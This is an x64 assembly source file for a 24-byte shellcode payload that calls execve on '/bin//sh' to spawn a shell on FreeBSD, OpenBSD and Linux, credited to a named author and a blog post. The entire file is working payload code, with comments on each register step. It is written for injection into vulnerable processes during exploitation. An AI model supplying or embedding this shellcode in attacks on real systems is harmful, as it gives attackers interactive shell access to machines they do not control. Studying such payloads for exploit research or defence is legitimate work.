; Thanks to https://modexp.wordpress.com/2016/04/03/x64-shellcodes-bsd

; 24 byte execve("/bin//sh", {"/bin//sh", NULL}, 0);
; x64 versions of freebsd + openbsd + linux
; odzhan

    bits 64

    push    59
    pop     rax
    cdq                      ; rdx=envp=0
    mov     rbx, '/bin//sh'
    push    rdx              ; 0
    push    rbx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; rdi="/bin//sh", 0
    ; ---------
    push    rdx              ; argv[1]=NULL
    push    rdi              ; argv[0]="/bin//sh", 0
    push    rsp
    pop     rsi              ; rsi=argv
    ; ---------
    syscall
